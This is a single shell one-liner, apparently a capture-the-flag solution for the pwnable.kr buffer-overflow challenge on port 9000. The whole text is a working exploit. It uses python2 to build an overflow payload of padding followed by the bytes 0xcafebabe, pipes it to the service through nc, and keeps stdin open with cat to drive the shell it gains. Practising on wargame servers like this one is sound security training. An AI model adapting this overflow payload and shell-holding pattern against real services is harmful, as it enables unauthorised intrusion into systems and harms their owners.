#tty #stdin
(echo `python2 -c "print 'A'*32 + 'BBBB'*5 + '\xbe\xba\xfe\xca'"`; cat) | nc pwnable.kr 9000
